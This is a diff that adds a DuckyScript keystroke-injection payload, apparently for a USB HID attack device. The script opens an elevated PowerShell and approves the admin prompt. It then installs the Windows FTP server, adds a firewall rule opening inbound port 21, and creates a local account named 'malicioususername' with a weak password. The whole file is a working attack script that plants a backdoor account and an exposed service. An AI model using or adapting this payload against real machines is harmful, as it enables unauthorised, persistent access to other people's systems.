@@ -1,0 +1,32 @@
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 500
+STRING Install-WindowsFeature Web-Ftp-Server -IncludeManagementTools
+ENTER
+DELAY 5000
+ALT y
+DELAY 1000
+STRING netsh advfirewall firewall add rule name="FTP Server" action=allow protocol=TCP dir=in localport=21
+ENTER
+DELAY 500
+STRING GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING net user malicioususername password123 /add
+ENTER
+DELAY 500
+STRING net localgroup users malicioususername /add
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
+STRING exit
+ENTER
